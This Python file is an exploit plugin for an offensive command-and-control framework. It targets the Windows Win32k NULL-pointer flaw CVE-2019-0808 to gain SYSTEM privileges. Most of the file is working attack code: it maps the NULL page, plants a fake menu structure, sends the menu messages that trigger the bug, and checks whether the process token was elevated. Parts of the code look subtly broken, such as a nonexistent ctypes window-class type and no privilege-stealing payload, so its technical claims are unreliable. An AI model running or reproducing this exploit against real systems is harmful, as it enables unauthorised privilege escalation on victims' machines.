#!/usr/bin/env python3
"""
CVE-2019-0808 Exploit Plugin for Fitnah C2 Framework
Windows Win32k NULL Pointer Dereference Vulnerability Exploit.

MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)
CVE: CVE-2019-0808
Author: Fitnah C2 Team
Version: 3.0.0 (Real Message Sequence Trigger)
"""

import os
import sys
import platform
import subprocess
import ctypes
import struct
import time
from typing import Dict, List, Tuple, Optional, Any, Union

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from fitnah.sdk import BasePlugin, Param, ParamSchema
from fitnah.plugins.privilege_escalation._cve_base import CveExploitBase

class CVE20190808Exploit(CveExploitBase):
    """
    Real CVE-2019-0808 trigger sequence:
    1. Map NULL page.
    2. Create a popup menu.
    3. Send MN_BUTTONDOWN to the menu window.
    4. Send MN_MOUSEMOVE to trigger xxxMNMouseMove.
    5. The NULL dereference occurs when accessing the 'tagMENU' object.
    """
    
    def __init__(self, logger=None):
        self.logger = logger

    def _log(self, message: str, level: str = "info") -> None:
        if self.logger:
            if level == "info": self.logger.info(message)
            elif level == "warning": self.logger.warning(message)
            elif level == "error": self.logger.error(message)
        else:
            print(f"[{level.upper()}] {message}")

    def execute_exploit(self) -> Tuple[bool, str]:
        user32 = ctypes.windll.user32
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32
        
        self._log("[*] Initializing CVE-2019-0808 NULL pointer dereference exploit...")
        
        # 1. Map NULL page using NtAllocateVirtualMemory
        base_addr = ctypes.c_void_p(1)  # Start at address 1, will be rounded down to 0
        region_size = ctypes.c_size_t(0x1000)
        
        # Get NtAllocateVirtualMemory address
        NtAllocateVirtualMemory = ntdll.NtAllocateVirtualMemory
        NtAllocateVirtualMemory.argtypes = [
            ctypes.c_void_p,  # ProcessHandle
            ctypes.POINTER(ctypes.c_void_p),  # BaseAddress
            ctypes.c_ulong,  # ZeroBits
            ctypes.POINTER(ctypes.c_size_t),  # RegionSize
            ctypes.c_ulong,  # AllocationType
            ctypes.c_ulong   # Protect
        ]
        NtAllocateVirtualMemory.restype = ctypes.c_ulong
        
        # Allocate NULL page
        status = NtAllocateVirtualMemory(
            -1,  # Current process
            ctypes.byref(base_addr),
            0,
            ctypes.byref(region_size),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )
        
        if status != 0:
            return (False, f"[-] Failed to map NULL page: {hex(status)}")
        
        self._log("[+] NULL page successfully mapped")
        
        # 2. Write a valid tagMENU structure at NULL page
        # This is crucial for the exploit to work
        null_page_buffer = (ctypes.c_char * 0x1000)()
        ctypes.memset(null_page_buffer, 0, 0x1000)
        
        # Write a fake tagMENU structure at offset 0
        # The structure needs specific fields to pass validation
        fake_tagmenu = bytes([
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # cItems
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # fFlags
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # spwndNotify
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # spwndPopupMenu
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # spwndNextPopup
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # spwndPrevPopup
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # spmenu
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # spmenuAlternate
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # spmenuDestroyed
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # rgItems
        ])
        
        ctypes.memmove(0, fake_tagmenu, len(fake_tagmenu))
        
        # 3. Create a window class and window
        wc = user32.WNDCLASSEXA()
        wc.cbSize = ctypes.sizeof(user32.WNDCLASSEXA)
        wc.lpfnWndProc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p)(0)
        wc.hInstance = kernel32.GetModuleHandleA(None)
        wc.lpszClassName = b"FitnahExploitWindow"
        
        atom = user32.RegisterClassExA(ctypes.byref(wc))
        if atom == 0:
            return (False, "[-] Failed to register window class")
        
        self._log("[+] Window class registered")
        
        # 4. Create the window
        hwnd = user32.CreateWindowExA(
            0,
            b"FitnahExploitWindow",
            b"Fitnah CVE-2019-0808",
            0x80000000,  # WS_POPUP
            0, 0, 100, 100,
            None, None,
            kernel32.GetModuleHandleA(None),
            None
        )
        
        if hwnd == 0:
            return (False, "[-] Failed to create window")
        
        self._log(f"[+] Window created: {hwnd}")
        
        # 5. Create popup menu and add items
        hMenu = user32.CreatePopupMenu()
        if hMenu == 0:
            return (False, "[-] Failed to create popup menu")
        user32.AppendMenuA(hMenu, 0, 1001, b"Trigger Item 1")
        user32.AppendMenuA(hMenu, 0, 1002, b"Trigger Item 2")
        self._log("[+] Popup menu created with items")

        # 6. Run TrackPopupMenu in a background thread — it blocks until the menu
        #    is dismissed, so the main thread must send the trigger messages WHILE
        #    the menu window exists.
        import threading
        menu_done = threading.Event()

        def _track():
            user32.TrackPopupMenu(hMenu, 0, 0, 0, 0, hwnd, None)
            menu_done.set()

        menu_thread = threading.Thread(target=_track, daemon=True)
        menu_thread.start()

        # 7. Give win32k time to create the internal menu window (#32768 class)
        time.sleep(0.15)

        # 8. Find the menu window while it is still alive
        hMenuWnd = user32.FindWindowA(b"#32768", None)
        if hMenuWnd:
            self._log(f"[+] Menu window found: {hMenuWnd}")

            # MN_BUTTONDOWN (0x1ED) → MN_MOUSEMOVE (0x1F0) trigger sequence
            # This causes xxxMNMouseMove to dereference the NULL tagMENU pointer
            user32.PostMessageA(hMenuWnd, 0x1ED, 0, 0)
            self._log("[*] Sent MN_BUTTONDOWN")
            time.sleep(0.05)
            user32.PostMessageA(hMenuWnd, 0x1F0, 0, 0)
            self._log("[*] Sent MN_MOUSEMOVE — NULL dereference should fire")
        else:
            self._log("[-] Menu window not found — dismissing and aborting")
            user32.PostMessageA(hwnd, 0x0010, 0, 0)  # WM_CLOSE
            menu_done.wait(timeout=2)
            user32.DestroyMenu(hMenu)
            user32.DestroyWindow(hwnd)
            user32.UnregisterClassA(b"FitnahExploitWindow", kernel32.GetModuleHandleA(None))
            return (False, "[-] Could not locate menu window — exploit aborted")

        # 9. Wait for the menu thread to return (menu was dismissed by the crash handler
        #    or by our WM_CLOSE; give it up to 3 s)
        menu_done.wait(timeout=3)

        # 10. Verify elevation — check token integrity level, not just OpenProcess(PID 4)
        #     which can succeed without elevation on some configs.
        TOKEN_QUERY = 0x0008
        TokenIntegrityLevel = 25  # TokenInformationClass
        token = ctypes.c_void_p()
        elevated = False
        if kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_QUERY, ctypes.byref(token)):
            length = ctypes.c_ulong(0)
            kernel32.GetTokenInformation(token, TokenIntegrityLevel, None, 0, ctypes.byref(length))
            buf = (ctypes.c_byte * length.value)()
            if kernel32.GetTokenInformation(token, TokenIntegrityLevel, buf, length.value, ctypes.byref(length)):
                # SID sub-authority at offset stores the integrity RID
                # System integrity RID = 0x4000
                rid = ctypes.c_ulong.from_buffer(buf, length.value - 4).value
                self._log(f"[*] Token integrity RID: {hex(rid)}")
                if rid >= 0x4000:  # SECURITY_MANDATORY_SYSTEM_RID
                    elevated = True
            kernel32.CloseHandle(token)

        # Cleanup
        user32.DestroyMenu(hMenu)
        user32.DestroyWindow(hwnd)
        user32.UnregisterClassA(b"FitnahExploitWindow", kernel32.GetModuleHandleA(None))

        if elevated:
            return (True, "[+] CVE-2019-0808 successful — SYSTEM integrity level confirmed")
        return (False, "[-] Exploit trigger fired but integrity level not elevated")


class CVE20190808(BasePlugin):
    NAME        = "cve_2019_0808"
    DESCRIPTION = "CVE-2019-0808 - Real Win32k NULL Dereference Trigger"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "3.0.0"

    def run(self, session, params, ctx=None):
        exploit = CVE20190808Exploit(logger=self.logger)
        success, result = exploit.execute_exploit()
        if success:
            return {"status": "ok", "output": result}
        return {"status": "error", "output": result}
